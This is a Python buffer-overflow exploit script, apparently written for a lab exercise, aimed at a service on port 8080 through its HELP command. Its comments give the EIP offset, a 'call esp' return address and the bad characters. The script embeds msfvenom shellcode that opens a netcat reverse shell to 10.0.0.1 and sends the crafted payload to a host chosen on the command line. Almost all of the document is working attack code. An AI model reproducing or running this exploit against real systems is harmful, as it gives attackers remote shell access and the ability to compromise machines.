#!/usr/bin/python3
import sys, socket

if len(sys.argv) < 2:
	print("\nUsage: " + sys.argv[0] + " <HOST>\n")
	sys.exit()


# eip = 41306341
# msf-pattern_offset -q 41306341
# [*] Exact match at offset 60
# ESP to EIP
# call esp = 08048a83
# call esp = 08049a83
# 0x08049a83
# badchars \x00

cmd = b"HELP"
junk = b"A" * 60
eip = b"\x83\x9a\x04\x08"
filler = b"\x43" * 1783
nop_sled = b"\x90" * 16
end = b"\r\n"

# msfvenom -p linux/x86/exec CMD="rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 80 >/tmp/f" EXITFUNC=thread -b "\x00" -f python

shellcode =  b""
shellcode += b"\xd9\xc5\xbd\xb3\x2b\x7f\x0a\xd9\x74\x24\xf4"
shellcode += b"\x58\x2b\xc9\xb1\x1d\x31\x68\x19\x83\xe8\xfc"
shellcode += b"\x03\x68\x15\x51\xde\x15\x01\xcd\xb8\xb8\x73"
shellcode += b"\x85\x97\x5f\xf5\xb2\x80\xb0\x76\x54\x51\xa7"
shellcode += b"\x57\xc6\x38\x59\x21\xe5\xe9\x4d\x7e\xe9\x0d"
shellcode += b"\x8e\xf3\x84\x2d\xa1\x87\x3b\x5e\x92\x01\xf8"
shellcode += b"\xf3\x87\xab\x97\x6d\x37\x14\x48\x06\xaa\x24"
shellcode += b"\xb9\x80\x0f\xa6\xa4\x38\x50\x07\x52\xac\xe0"
shellcode += b"\x78\xfc\x52\x2e\xe5\x69\xc5\x1f\x9a\x01\x39"
shellcode += b"\x4d\x35\xf1\x0b\xb3\xe3\xc0\x17\xa5\x88\x02"
shellcode += b"\xd0\x0f\x61\x73\x19\x40\x53\x42\x60\x91\x85"
shellcode += b"\x92\xa5\xf1\xe1\xea\xe9\xcf\x3e\x7e\x87\x5f"
shellcode += b"\x6e\x18\x57\xf7\x23\x6d\xb6\x3a\x43"

buffers = cmd + junk + eip + nop_sled + shellcode + filler + end
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((sys.argv[1], 8080))
s.send(buffers)
s.recv(1024)
print(s)
s.close()
